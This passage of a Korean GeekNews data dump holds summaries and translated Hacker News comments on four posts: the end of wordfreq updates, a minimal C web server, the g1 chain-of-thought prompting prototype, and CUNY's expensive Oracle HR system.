          + Python 3과 호환되도록 작업 중이며, 소스 폰트를 서브모듈에 포함시킴
"
"https://news.hada.io/topic?id=16831","wordfreq 업데이트 중단 이유","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          wordfreq 업데이트 중단 이유

wordfreq가 더 이상 업데이트되지 않는 이유

  생성형 AI가 데이터를 오염시킴

     * 2021년 이후 인간의 언어 사용에 대한 신뢰할 수 있는 정보가 없음
     * wordfreq의 데이터 소스 중 하나였던 열린 웹(OSCAR)이 이제는 대형 언어 모델이 생성한 의미 없는 텍스트로 가득 차 있음
     * 이러한 텍스트를 데이터에 포함시키면 단어 빈도가 왜곡됨
     * 예를 들어, ChatGPT는 ""delve""라는 단어에 집착하여 그 빈도를 비정상적으로 증가시킴

  무료였던 정보가 비싸짐

     * wordfreq는 트위터와 레딧에서 대화형 언어 사용 데이터를 수집했음
     * 트위터 데이터는 항상 불안정했으며, 이제는 트위터가 사라지고 X로 대체됨
     * 레딧도 공공 데이터 아카이브 제공을 중단하고, 이제는 OpenAI만이 지불할 수 있는 가격에 데이터를 판매함

  더 이상 이 분야에 참여하고 싶지 않음

     * wordfreq는 코퍼스 언어학과 자연어 처리 도구에 도움이 되었음
     * 그러나 현재 자연어 처리 분야는 생성형 AI에 의해 잠식되고 있음
     * OpenAI와 Google이 통제하는 폐쇄된 데이터에 의존하지 않는 NLP 연구를 찾기 어려움
     * 텍스트 수집 도구는 이제 주로 생성형 AI 훈련에 사용되며, 이는 저작권 침해 문제를 야기함
     * 생성형 AI와 혼동될 수 있는 작업에 참여하고 싶지 않음

GN⁺의 정리

     * wordfreq는 2021년까지의 언어 데이터를 기반으로 한 프로젝트였음
     * 생성형 AI의 등장으로 데이터의 신뢰성이 떨어지고, 트위터와 레딧 같은 주요 데이터 소스가 유료화되면서 업데이트가 중단됨
     * 자연어 처리 분야가 생성형 AI에 의해 잠식되면서, 저자는 더 이상 이 분야에 참여하고 싶지 않음을 밝힘
     * 비슷한 기능을 가진 프로젝트로는 Google Ngram Viewer와 같은 대체 도구를 추천함

        Hacker News 의견

     * Google의 SEO 규칙으로 인해 웹이 오염되었음. 단문 단락, 키워드 반복, 가독성보다 색인 가능성에 집중하는 글쓰기 방식이 문제임
          + ML/LLM은 두 번째 오염 원인임. 첫 번째는 기업 봇을 위한 글쓰기였음
     * 2023년에 LowBackgroundSteel.ai를 만들어 오염되지 않은 데이터셋을 모으는 장소로 사용함
          + Wordfreq를 추가할 예정임. Tumblr에 자료를 제출해달라는 요청임
     * NLP 커뮤니티에 대한 실망감을 이해하지만, 모든 사람이 그런 것은 아님
          + 웹 오염 문제는 새로운 것이 아님. PageRank를 조작하려는 스팸 농장 등도 있었음
          + 각 세대의 웹은 그 세대의 문제를 극복하기 위한 기술이 필요함
          + George Orwell의 1984에서 예견한 자동 생성 콘텐츠 소비가 현실이 되었음. 그러나 이 기술은 좋은 방향으로도 사용될 수 있음
     * 웹이 죽었다고 생각함. AI로 인해 유용한 정보를 찾는 데 시간이 더 걸림
          + 특정 무선 이어폰을 찾는 데 10분 이상 걸림. 사이트들이 쓰레기로 가득 차 있음
          + 오래된 노트북으로는 그래픽이 많은 현대 웹사이트를 탐색하기 어려움
          + 웹, 웹 브라우저, 웹 디자인, SEO, 검색, 광고 등 모든 것이 싫음. 웹을 사용하지 않고 구매할 수 있는 방법을 찾고 있음
     * Google Trends 링크를 공유하며 ""delve"" 검색 결과가 증가하지 않았다는 재미있는 사실을 언급함
     * 2021년 이후 인간의 언어 사용에 대한 신뢰할 만한 정보가 없다고 생각함
          + 텍스트는 이미 임계점을 넘었지만, 비디오는 지금이 중요한 시기임
          + 특히 어린 아이들은 무엇이 진짜인지 구분하기 어려움. 기술은 이미 존재하지만 대부분의 비디오 콘텐츠는 아직 영향을 받지 않음
     * 웹이 LLM에 의해 생성된 쓰레기로 가득 차 있다는 의견에 동의함
          + 많은 경우 SEO를 위해 가치 없는 콘텐츠가 생성됨
     * AGI가 저렴하고 접근 가능해지면 대부분의 작업이 AI에 의해 수행될 것임
          + AI 혁명은 AI의 뿌리와 가장 가까운 분야에서 시작해야 함
     * 2020년 이전의 종이 책이 가치 있는 자산이 될 수 있음
          + 인터넷이 쓰레기로 가득 차고 현대의 종이 책도 의심받게 될 것임
          + AI가 쓴 책의 저자로 인간이 포장될 것임
     * AI로 인해 일자리를 잃은 작가들은 AI 하이퍼스케일러에 의해 고용되어야 함
          + 단, 그들의 작품에는 AI가 생성한 문장이 없어야 함
"
"https://news.hada.io/topic?id=16934","HN에 공개: C 웹 서버를 사용한 웹사이트 호스팅","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      HN에 공개: C 웹 서버를 사용한 웹사이트 호스팅

My Blog Technology

   이 웹 서버는 내 블로그를 호스팅하기 위해 설계된 최소한의 웹 서버임. 처음부터 공용 인터넷에 견딜 수 있도록 견고하게 제작되었음. 리버스 프록시가 필요하지 않음. 실제 동작하는 모습을 http://playin.coz.is/index.html에서 볼 수 있음. Reddit에 해킹을 요청하여 재미있고 악의적인 요청 로그를 기가바이트 단위로 수집했음. 일부는 attempts.txt에 저장했고, 나중에 재미로 더 찾아볼 예정임.

  하지만.. 왜?

   나는 나만의 도구를 만드는 것을 즐기며, 모든 것이 ""전투 테스트""되어야 한다는 말을 듣는 것에 지쳤음. 충돌이 발생하면 어쩔 것인가? 버그는 수정할 수 있음.

  사양

     * Linux 전용
     * HTTP/1.1, 파이프라이닝, keep-alive 연결 구현
     * HTTPS 지원 (BearSSL을 사용하여 TLS 1.2까지)
     * 최소한의 종속성 (HTTPS 사용 시 libc와 BearSSL)
     * 구성 가능한 타임아웃
     * 접근 로그, 충돌 로그, 로그 회전, 디스크 사용량 제한
     * Transfer-Encoding: Chunked 없음 (411 Length Required로 응답하여 클라이언트가 Content-Length와 함께 다시 전송하도록 유도)
     * 단일 코어 (더 나은 VPS를 얻으면 변경될 예정)
     * 정적 파일 캐싱 없음 (아직)

  벤치마크

   이 프로젝트의 초점은 견고성에 있지만, 결코 느리지 않음. nginx와의 간단한 비교 (정적 엔드포인트, 둘 다 단일 스레드, 1K 연결 제한):
     * (blogtech)
$ wrk -c 500 -d 5s http://127.0.0.1:80/hello

          + 평균 대기 시간: 6.66ms
          + 요청/초: 76974.24
          + 전송/초: 6.09MB
     * (nginx)
$ wrk -c 500 -d 5s http://127.0.0.1:8080/hello

          + 평균 대기 시간: 149.11ms
          + 요청/초: 44227.78
          + 전송/초: 8.27MB

   nginx 설정:
worker_processes 1;
events {
  worker_connections 1024;
}
http {
  server {
    listen 8080;
    location /hello {
      add_header Content-Type text/plain;
      return 200 ""Hello, world!"";
    }
  }
}

  빌드 및 실행

   기본적으로 서버 빌드는 HTTP 전용임:
$ make

   이 명령은 serve (릴리스 빌드), serve_cov (커버리지 빌드), serve_debug (디버그 빌드) 실행 파일을 생성함. 릴리스 빌드는 포트 80에서, 디버그 빌드는 포트 8080에서 청취함.

   HTTPS를 활성화하려면 BearSSL을 클론하고 빌드해야 함:
$ mkdir 3p
$ cd 3p
$ git clone https://www.bearssl.org/git/BearSSL
$ cd BearSSL
$ make -j
$ cd ../../
$ make -B HTTPS=1

   동일한 실행 파일이 생성되지만, 포트 443 (릴리스) 또는 8081 (디버그)에서 보안 연결이 가능함. cert.pem과 key.pem 파일을 실행 파일과 동일한 디렉토리에 배치해야 함. 이름과 위치를 변경하려면 다음을 수정:
#define HTTPS_KEY_FILE ""key.pem""
#define HTTPS_CERT_FILE ""cert.pem""

   로컬에서 HTTPS로 테스트하려면 자체 서명된 인증서(및 개인 키)를 생성:
openssl genpkey -algorithm RSA -out key.pem -pkeyopt rsa_keygen_bits:2048
openssl req -new -x509 -key key.pem -out cert.pem -days 365

  사용법

   서버는 docroot/ 폴더에서 정적 콘텐츠를 제공함. 이를 변경하려면 respond 함수를 수정:
typedef struct {
  Method method;
  string path;
  int major;
  int minor;
  int nheaders;
  Header headers[MAX_HEADERS];
  string content;
} Request;

void respond(Request request, ResponseBuilder *b) {
  if (request.major != 1 || request.minor > 1) {
    status_line(b, 505); // HTTP Version Not Supported
    return;
  }

  if (request.method != M_GET) {
    status_line(b, 405); // Method Not Allowed
    return;
  }

  if (string_match_case_insensitive(request.path, LIT(""/hello""))) {
    status_line(b, 200);
    append_content_s(b, LIT(""Hello, world!""));
    return;
  }

  if (serve_file_or_dir(b, LIT(""/""), LIT(""docroot/""), request.path, NULLSTR, false))
    return;

  status_line(b, 404);
  append_content_s(b, LIT(""Nothing here :|""));
}

   여기에서 request.path 필드를 전환하여 엔드포인트를 추가할 수 있음. 경로는 요청 버퍼의 슬라이스일 뿐임. URI는 파싱되지 않음.

  테스트

   서버를 valgrind와 sanitizers (주소, 정의되지 않음)로 정기적으로 실행하고 wrk를 사용하여 타겟팅함. 또한 HTTP/1.1 사양 준수를 확인하기 위해 tests/test.py에 자동화된 테스트를 추가하고 있음. 내 웹사이트를 호스팅하고 여기저기 게시하여 스트레스를 유지함. 인터넷에서 취약한 웹사이트를 스캔하는 모든 봇이 훌륭한 퍼저가 됨.

  알려진 문제

     * 서버가 HTTP/1.0 클라이언트에 HTTP/1.1로 응답함

  기여

   나는 주로 DEV 브랜치에서 작업하고 가끔 MAIN으로 병합함. 풀 리퀘스트를 열 때 DEV를 타겟으로 하면 더 쉬워질 것임.

GN⁺의 정리

     * 이 프로젝트는 최소한의 종속성과 견고성을 목표로 하는 웹 서버임.
     * HTTP/1.1과 HTTPS를 지원하며, 다양한 로그 기능과 구성 가능한 타임아웃을 제공함.
     * 벤치마크 결과 nginx보다 빠른 응답 시간을 보여줌.
     * 개발자들이 자신의 도구를 만들고 버그를 수정하는 과정을 즐길 수 있도록 설계됨.
     * 비슷한 기능을 가진 프로젝트로는 Nginx와 Apache HTTP Server가 있음.

        Hacker News 의견

     * 역방향 프록시 필요 없음: Jetty를 사용해 역방향 프록시 없이 앱을 인터넷에 배포해도 문제가 없었음
          + 보안이나 성능에 대한 구체적인 이유 없이 역방향 프록시를 사용하라는 의견이 많음
          + 역방향 프록시가 정말 필요한지 의문을 가짐
     * 자체 제작한 C 웹 서버: 상업용 웹사이트를 운영했던 C 웹 서버를 제작했음
          + 128MB RAM과 1 CPU로 많은 트래픽을 처리했음
          + 20년 전 인터넷 환경이 덜 적대적이었음을 언급함
          + 봇이 훌륭한 퍼저(fuzzer) 역할을 하지만 실제 퍼징도 필요함
     * 서비스 구축의 만족감: 시스템 API를 사용해 기본적인 서비스를 구축하는 것이 매우 만족스러움
          + poll() 함수가 높은 성능을 보여주는 것에 놀람
          + 연결별 함수와 관련 구조체, 배열이 nginx, redis, memcached와 유사함
          + 훌륭한 작업임
     * 작은 프로젝트 소개: 여가 시간에 시작한 재미있는 프로젝트를 소개함
     * Kore 프레임워크 추천: C 앱을 작성할 때 공개된 부분을 작성하는 것이 불편하다면 Kore 프레임워크를 추천함
          + ACME 인증서 관리, Pgsql, curl, 웹소켓 등의 기능이 내장되어 있음
          + Lua/Python과 C를 혼합하여 모듈을 빌드하고 실행할 수 있음
     * 흥미로운 링크 공유: sqlite.org의 althttpd 인스턴스가 하루에 50만 개 이상의 HTTP 요청을 처리함
          + $40/월 Linode에서 200GB의 콘텐츠를 제공함
          + HTTP 요청의 19%가 CGI를 통해 Fossil 소스 코드 저장소에 접근함
     * 자체 도구 제작의 즐거움: 모든 것이 ""전투 테스트""되어야 한다는 의견에 지침
          + 버그는 수정할 수 있음
     * Chaos Communication Congress 강연: 보안 기능이 포함된 C로 작성된 블로그/웹 서버에 대한 강연을 상기시킴
          + 불변 저장소, 권한 축소, TLS 인증서 접근 불가 등의 기능이 포함됨
     * 안정적인 웹사이트: 첫 페이지에 표시되어도 크래시하지 않는 웹사이트
     * 기본으로 돌아가기: 필요한 것만 사용하여 기본으로 돌아가는 접근 방식을 좋아함
          + 소프트웨어의 불필요한 기능이 성능에 미치는 영향을 의문시함
          + 개발자에게 축하 인사를 전함
"
"https://news.hada.io/topic?id=16803","g1 - Groq에서 Llama-3.1 70B를 사용하여 o1과 유사한 추론 체인 생성","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            g1 - Groq에서 Llama-3.1 70B를 사용하여 o1과 유사한 추론 체인 생성

     * g1은 LLM의 추론 능력을 향상시키기 위해 프롬프트 전략을 사용하는 초기 프로토타입
     * 이는 LLM이 논리적 문제를 해결할 수 있게 하며, 기존 모델들이 어려워하는 문제를 해결할 수 있게 함
     * g1은 오픈 소스 커뮤니티가 새로운 전략을 개발하도록 영감을 주기 위해 오픈 소스로 공개

    작동 방식

     * g1은 Llama3.1-70b를 사용하여 동적 Chain of Thought를 생성함.
     * 각 단계에서 LLM은 다음 추론 단계로 진행하거나 최종 답변을 제공할 수 있음.
     * 시스템 프롬프트에는 LLM을 위한 팁이 포함됨.
     * 예를 들어, ""대안 답변 탐색 포함"" 및 ""답을 도출하기 위해 최소 3가지 방법 사용""과 같은 지시사항이 있음.
     * 이러한 방법을 통해 LLM의 추론 능력이 향상됨.

    예시

     * g1은 단순 논리 문제를 60-80%의 정확도로 해결할 수 있음.
     * 예시: ""strawberry에 R이 몇 개 있나요?""라는 질문에 대해 g1은 70%의 정확도를 보임.

    빠른 시작

     * Streamlit UI 사용 방법:
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
export GROQ_API_KEY=gsk...
streamlit run app.py

     * Gradio UI 사용 방법:
cd gradio
pip3 install -r requirements.txt
python3 app.py

    프롬프트 전략

     * 프롬프트 예시:
{
  ""title"": ""Identifying Key Information"",
  ""content"": ""To begin solving this problem, we need to carefully examine the given information and identify the crucial elements that will guide our solution process. This involves..."",
  ""next_action"": ""continue""
}

     * 프롬프트 구성:
          + 전문가 AI 어시스턴트 역할 부여
          + 각 단계에 제목과 내용을 제공
          + JSON 형식으로 응답
          + 최소 3단계 이상의 추론 단계 사용
          + LLM의 한계를 인식하고 대안 답변 탐색 포함
          + 재검토 시 실제로 다른 접근 방식을 사용

    주요 포크

     * Mult1: 여러 AI 제공자를 사용하여 o1과 유사한 추론 체인 생성 (GitHub Repository)

    Credits

     * 이 앱은 Benjamin Klieger에 의해 개발됨

    GN⁺의 정리

     * g1은 LLM의 추론 능력을 향상시키기 위한 프롬프트 전략을 사용하는 초기 프로토타입임.
     * 오픈 소스 커뮤니티가 새로운 전략을 개발하도록 영감을 주기 위해 오픈 소스로 공개됨.
     * g1은 단순 논리 문제를 해결하는 데 있어 기존 모델보다 높은 정확도를 보임.
     * 이 기사는 LLM의 추론 능력을 향상시키기 위한 다양한 방법을 탐구하는 데 유용함.
     * 유사한 기능을 가진 다른 프로젝트로는 OpenAI의 o1이 있음.

        Hacker News 의견

     * ChainOfThought 방법은 단순하며, TreeOfThoughts가 더 정교한 방법임
          + OpenAI와 관련된 힌트는 트리 탐색과 관련이 있음
          + CoT를 트리로 구축하고 최적의 솔루션을 찾는 것이 중요함
     * 대문자로 지시사항을 강조하는 것이 재미있음
          + AGI를 성공시키는 첫 번째 사람은 LLM의 신뢰성을 높이는 방법을 찾을 것임
     * o1의 혁신은 Chain-of-Thought가 아니라 CoT를 잘 수행하도록 모델을 가르치는 것임
          + 단순한 프롬프트 엔지니어링으로는 o1 성능을 얻을 수 없음
     * LLM이 입력을 다르게 '확대'하여 문제를 해결할 수 있음
          + 텍스트를 글자별로 입력하거나 이미지 형태로 변환하여 세부 사항을 확인할 수 있음
     * optillm 프로젝트와 유사한 작업을 수행함
          + 여러 최적화 기술을 사용하여 LLM을 개선할 수 있음
     * ollama:8b를 사용하여 100% 로컬에서 실행하도록 변경함
          + Readme는 아직 업데이트되지 않음
     * ""추론""의 정의를 찾는 것이 중요함
          + LLM의 추론 문제를 고전 알고리즘과 결합하여 해결할 수 있음
          + 생각 과정을 두 부분으로 나누고 적절한 모델에서 실행해야 함
     * .9와 .11 중 어느 것이 더 큰지 묻는 프롬프트에서 .9가 더 크다고 응답함
          + 이는 단순한 시스템 프롬프트임
     * 재미로 Llama-3.1 7B 모델을 로컬에서 실행하도록 프로젝트를 포크함
          + 딸기 문제는 해결하지 못하지만 0.9가 더 크다는 것을 알아냄
"
"https://news.hada.io/topic?id=16847","CUNY, 2013년 HR 소프트웨어를 위해 Oracle에 6억 달러 지불","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               CUNY, 2013년 HR 소프트웨어를 위해 Oracle에 6억 달러 지불

    CUNYFirst 컴퓨터 시스템이 대학 행정 통제에 미치는 영향

     * CUNYFirst의 아이디어는 모든 대학/캠퍼스 비즈니스 프로세스를 통합하는 통합 시스템을 구축하는 것임
          + 여러 개의 중복되고 협력하지 않는 서드파티 시스템을 유지하는 비용을 절감할 수 있음
          + 행정, 직원, 교수진, 학생들에게 정보 접근성을 제공할 수 있음
     * 그러나 CUNY 중앙의 동기는 이러한 이점과는 무관함
          + CUNY 중앙은 모든 대학 활동, 특히 커리큘럼에 대한 절대적인 통제를 원함
          + 카탈로그, 공지사항, 성적표 등을 통제함으로써 커리큘럼을 통제할 수 있음
          + CUNY 중앙은 대학의 임의 자금에 대한 접근을 원함
     * CUNYFirst 구매를 위한 협상은 실패로 끝남
          + 프로젝트를 제대로 수행하려면 최대 10억 달러가 필요했음
          + CUNY 중앙은 훨씬 적은 금액을 제안함
          + 대부분의 입찰자가 탈락했으며, Oracle-PeopleSoft만 남음
          + Oracle-PeopleSoft는 맞춤화가 아닌 구성만 가능하다고 경고함
     * CUNY는 약 6억 달러를 시스템에 투자했지만, 상황은 더 악화됨
          + 비즈니스 프로세스가 비효율적으로 변해 더 많은 인력을 고용해야 함
          + HEOs와 일부 사무직 직원들이 추가 근무를 해야 했음
     * CUNYFirst는 작동하지만, 매우 나쁘게 작동함
          + 인터페이스는 초기 90년대 기술 수준임
          + 맞춤화를 하지 않아서 강좌 번호를 변경해야 했음
          + 보안 모델이 부적절하여 학생들이 다른 학생의 데이터를 접근할 수 있음
          + HR은 여러 캠퍼스에서 다양한 역할을 하는 사람들을 관리하는 데 어려움을 겪음
     * Brooklyn College와 다른 ""Wave 3"" 캠퍼스는 적응해야 함
          + 이전 ""Wave"" 캠퍼스의 사람들은 이미 적응했음
          + Brooklyn College는 최고의 추가 시스템을 가지고 있었기 때문에 더 큰 고통을 겪을 것임
     * 초기 테스트는 실패했지만, 현재는 어느 정도 개선됨
     * CUNYFirst가 사용자에게 나쁘더라도, CUNY 중앙에게는 성공임

    GN⁺의 정리

     * CUNYFirst는 대학 행정 통제를 강화하기 위해 도입된 시스템임
     * 그러나 맞춤화 부족과 비효율적인 프로세스로 인해 많은 문제를 야기함
     * 대학 직원과 학생들에게 큰 부담을 주고 있음
     * 이 기사는 대학 행정 시스템의 문제점을 이해하는 데 도움이 됨
     * 유사한 기능을 가진 다른 시스템으로는 PeopleSoft, Banner 등이 있음

        Hacker News 의견

     * CUNY Central이 중앙 집중화된 MIS 도구를 사용하려는 의욕 때문에 Oracle의 ""구성 전용"" 제한을 무시했음
          + 기존 비즈니스 프로세스를 Oracle에 맞추어야 하며, 현재의 기능들이 사라질 것임
          + 직원, 교수진, 학생들이 적응해야 함
     * 일반적으로 맞춤형 소프트웨어를 구축하기보다는 기존 도구에 프로세스를 맞추는 것이 더 나음
          + 조직은 생각보다 덜 독특하며, 맞춤형 프로세스는 초기 직원의 선호에 따른 것일 수 있음
          + 맞춤형 소프트웨어는 지속적인 업데이트와 테스트 비용이 발생함
          + 표준 프로세스에 가까울수록 법적 규제 준수 가능성이 높음
     * Oracle에 대한 비판이 유행이지만, $600M 비용은 믿기 어려움
          + $6M 계약도 큰 규모임
          + 2013년 CUNY 전체 예산은 $2B였음
          + 고등 교육은 저렴한 비용으로 운영되며, 대형 기술 회사들은 큰 할인을 제공함
          + $600M 비용은 여러 해에 걸친 비용이라도 그 금액에 도달하지 않음
          + CUNY 연례 재무 보고서에서 이와 같은 큰 지출은 언급되지 않음
     * $175M의 클라우드로의 마이그레이션 자금 요청이 있었음
          + 자금 요청의 10-20%만 소프트웨어 벤더에게 실제로 지급됨
          + 대학은 자금 요청을 부풀려서 다른 역할을 채용하는 기회로 삼음
          + 자금 요청은 보통 여러 해에 걸쳐 승인됨
          + 실제 연간 마이그레이션 비용은 $10-20M일 수 있음
     * 학계와 학문 관리자들이 비즈니스 관점에서 운영하는 데 서투름
          + 학계의 문제는 학생 대출 프로그램에 의해 유지됨
          + 학생 대출 프로그램이 수정되거나 제거되면 미국 학계는 붕괴할 것임
     * 대학 시절에 클래스 관리 플랫폼을 구축했으나 Oracle과 경쟁에서 패배함
          + Oracle은 많은 비용이 들지만, 한 번 도입하면 더 이상 신경 쓸 필요가 없음
          + 더 나은 옵션이 있었으면 좋겠지만, edtech는 판매하기 어려운 분야임
     * CUNYfirst 시스템은 PeopleSoft 기반의 코스 등록 및 HR 시스템임
          + 최근 트위터에서 주목받음
     * 대학 HR 소프트웨어 벤더가 5-6개는 있어야 함
          + 1,000개의 라이선스 비용은 연간 $5,000, 총 $5M
          + 구현 및 사용자 교육 비용은 $25M
          + 다른 소프트웨어와의 통합 비용은 $25M
          + 회의 및 교육 비용은 $5M
          + 나머지 $540M의 출처는 불분명함
     * CUNY 학교의 IT 시스템은 매우 불편하고 직관적이지 않음
          + 모든 학생에게 직원 ID 번호가 부여됨
          + 코스 등록은 전자 상거래 애드온으로 처리됨
     * $600M은 새로운 회사를 설립하고 최고의 개발자들을 고용할 수 있는 금액임
     * 큰 비용의 소프트웨어 구매 결정은 종종 잘못된 방식으로 이루어짐
          + 비전문가들로 구성된 위원회
          + 좋은 의도로 시작했지만 지식이 부족한 사람
          + 개인적인 성과를 위해 추진하는 사람
          + ""큰 이름의 벤더를 선택하면 해고되지 않는다""는 생각을 가진 사람
          + 벤더에게 뇌물을 받는 사람
"
